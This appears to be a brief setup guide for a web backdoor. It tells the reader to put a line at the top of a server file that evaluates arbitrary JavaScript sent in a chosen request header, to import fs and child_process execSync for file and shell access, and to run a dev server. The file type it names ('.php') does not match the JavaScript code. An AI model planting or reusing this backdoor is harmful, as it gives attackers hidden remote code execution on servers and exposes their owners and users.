# 1. The Backdoor
Place `if (req.headers?.exploit) return (eval('let r = res;' + req.headers?.exploit));` at the top of the `.php` file.

Replace `exploit` with the header you're going to use (in lowercase). It must match with the `HEADER` variable on the client side.

Replace `res` in `let r = res;` with the name of of the ServerResponse parameter name.

Import `fs` and `{ execSync } from 'child_process`
# 2. Start the dev server
In this directory, run `npm start` to start a dev server on port 8000.